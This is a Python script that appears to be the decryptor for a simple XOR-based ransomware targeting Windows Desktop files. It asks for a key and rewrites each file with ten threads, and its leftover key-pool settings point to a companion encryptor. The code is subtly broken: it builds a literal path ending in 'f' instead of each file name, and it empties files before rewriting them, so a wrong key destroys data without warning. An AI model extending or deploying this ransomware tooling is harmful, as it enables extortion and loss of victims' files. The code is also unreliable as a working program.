import os 
import threading
import queue

def decrypt(key):
    while True:
        file = q.get()
        try:
            key_index = 0
            max_key_index = len(key) - 1 
            encrypted_data = ""
            with open(file, 'rb') as f:
                data = f.read()
            with open(file,'w') as f:
                f.write("")
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, "ab") as f:
                    f.write(xor_byte.to_bytes(1,"little"))
                #increment index
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f"{file} successfully decrypted!")
        except:
            print("Failed to decryt")
        q.task_done()
# Encription information
ENCRYPTION_LEVEL = 64 # 512 // 8  64 bytes
key_char_pool = "abcçdefgğhıijklmnoöprsştuüvyzABCÇDEFGĞHIİJKLMNOÖPRSŞTUÜVYZ;<.>?[]/,~^$(|)"
key_char_pool_len = len(key_char_pool)

# Dosyaların şifresini çözmek için dosya yollarını alıyoruz
print("Preparing files..")
desktop_path = os.environ["USERPROFILE"]+"\\Desktop"
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f"{desktop_path}\\{f}") and f != __file__[:-2]+'exe':
        abs_files.append(f"{desktop_path}\\f")
print("dosya yollarını başarıyla alıdı")

key = input("Enter the decryption key: ")
q = queue.Queue()
for f in abs_files:
    q.put(f)

for i in range(10):
    t = threading.Thread(target=decrypt, args=(key,), daemon=True)
    t.start()
q.join()
print("Decryption is finished.")
input()